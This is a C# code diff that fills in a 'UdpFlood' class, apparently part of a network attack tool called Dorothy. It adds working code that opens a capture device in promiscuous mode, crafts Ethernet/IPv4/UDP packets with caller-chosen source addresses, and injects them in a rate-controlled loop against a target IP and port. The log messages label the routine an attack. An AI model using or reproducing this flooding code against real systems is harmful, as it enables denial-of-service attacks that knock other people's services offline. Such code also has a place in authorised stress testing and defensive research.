@@ -1,7 +1,14 @@
 using System;
+using System.Linq;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 using NLog;
+using PacketDotNet;
+using SharpPcap;
+using SharpPcap.LibPcap;
 
 namespace Dorothy.Models
 {
@@ -9,18 +16,18 @@ namespace Dorothy.Models
     {
         private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
         private readonly string _sourceIp;
-        private readonly byte[] _sourceMac;
+        private readonly PhysicalAddress _sourceMac;
         private readonly string _targetIp;
         private readonly byte[] _targetMac;
         private readonly int _targetPort;
         private readonly long _bytesPerSecond;
         private readonly CancellationToken _cancellationToken;
-        private bool _isRunning;
+        private LibPcapLiveDevice? _device;
 
         public UdpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, int targetPort, long bytesPerSecond, CancellationToken cancellationToken)
         {
             _sourceIp = sourceIp;
-            _sourceMac = sourceMac;
+            _sourceMac = new PhysicalAddress(sourceMac);
             _targetIp = targetIp;
             _targetMac = targetMac;
             _targetPort = targetPort;
@@ -30,24 +37,97 @@ namespace Dorothy.Models
 
         public async Task StartAsync()
         {
-            _isRunning = true;
             Logger.Info("Starting UDP Flood attack.");
 
-            // Implement UDP Flood logic here
+            try
+            {
+                _device = CaptureDeviceList.Instance
+                    .OfType<LibPcapLiveDevice>()
+                    .FirstOrDefault(d => d.Addresses.Any(addr => addr.Addr.ipAddress != null && addr.Addr.ipAddress.ToString() == _sourceIp));
 
-            await Task.CompletedTask;
+                if (_device == null)
+                {
+                    Logger.Error("No device found with the specified source IP.");
+                    throw new Exception("No device found with the specified source IP.");
+                }
+
+                _device.Open(DeviceModes.Promiscuous, 1000);
+
+                if (_device is not IInjectionDevice injectionDevice)
+                {
+                    Logger.Error($"Device {_device.Name} does not support packet injection.");
+                    throw new Exception($"Device {_device.Name} does not support packet injection.");
+                }
+
+                // Construct the Ethernet packet
+                var ethernetPacket = new EthernetPacket(_sourceMac, new PhysicalAddress(_targetMac), EthernetType.IPv4);
+                
+                // Construct the IP packet
+                var ipPacket = new IPv4Packet(IPAddress.Parse(_sourceIp), IPAddress.Parse(_targetIp))
+                {
+                    Protocol = ProtocolType.Udp,
+                    TimeToLive = 128
+                };
+                var udpPacket = new UdpPacket(12345, (ushort)_targetPort)
+                {
+                    // Additional UDP properties can be set here if needed
+                };
+                
+                // Assign the UDP packet to the IP packet's payload
+                ipPacket.PayloadPacket = udpPacket;
+                
+                // Assign the IP packet to the Ethernet packet's payload
+                ethernetPacket.PayloadPacket = ipPacket;
+
+                // Calculate packets per second based on bytes per second
+                double packetSize = ethernetPacket.Bytes.Length;
+                int packetsPerSecond = (int)(_bytesPerSecond / packetSize);
+                packetsPerSecond = Math.Max(packetsPerSecond, 1); // Ensure at least 1 packet per second
+                double delay = 1000.0 / packetsPerSecond;
+
+                Logger.Info($"UDP Flood: Sending {packetsPerSecond} packets per second ({_bytesPerSecond / 125_000} Mbps).");
+
+                while (!_cancellationToken.IsCancellationRequested)
+                {
+                    try
+                    {
+                        injectionDevice.SendPacket(ethernetPacket);
+                    }
+                    catch (Exception ex)
+                    {
+                        Logger.Error(ex, "Failed to send UDP packet.");
+                    }
+
+                    await Task.Delay(TimeSpan.FromMilliseconds(delay), _cancellationToken)
+                        .ContinueWith(t => { }, TaskContinuationOptions.OnlyOnCanceled);
+                }
+            }
+            catch (TaskCanceledException)
+            {
+                Logger.Info("UDP Flood attack was canceled.");
+            }
+            catch (Exception ex)
+            {
+                Logger.Error(ex, "Error during UDP Flood attack.");
+            }
+            finally
+            {
+                _device?.Close();
+                Logger.Info("UDP Flood attack stopped.");
+            }
         }
 
-        public void Stop()
+        private int GenerateRandomPort()
         {
-            if (!_isRunning) return;
-            _isRunning = false;
-            Logger.Info("UDP Flood attack stopped.");
+            return new Random().Next(1024, 65535);
         }
 
         public void Dispose()
         {
-            Stop();
+            _device?.Dispose();
         }
+
+        [DllImport("iphlpapi.dll", ExactSpelling = true)]
+        private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
     }
 } 
